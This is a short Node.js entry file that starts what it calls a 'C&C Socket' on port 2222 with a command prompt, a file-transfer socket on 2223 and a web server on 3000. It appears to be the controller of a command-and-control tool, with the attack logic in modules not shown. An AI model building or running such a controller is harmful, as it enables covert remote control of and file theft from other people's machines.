// custom modules
const { server, clients, ioclients } = require('./utils/tls-com-sock')
const { fsServer, fsClients } = require('./utils/tls-file-sock')
const { httpServer } = require('./utils/sockio-web')
const prompt = require('./utils/prompt');

/**
 * listen to incoming tls socket connections and pass by reference to utils/prompt function
 */
server.listen(2222, () => {
    console.log('C&C Socket is live on port 2222')

    // CLI functionality. May depricate soon
    prompt()
})

fsServer.listen(2223, () => {
    console.log('FS Socket is live on port 2223')
})
/**
 * listen to http server on port 3000
 */
httpServer.listen(3000, () => {
    console.log('Webserver is live on port 3000')
})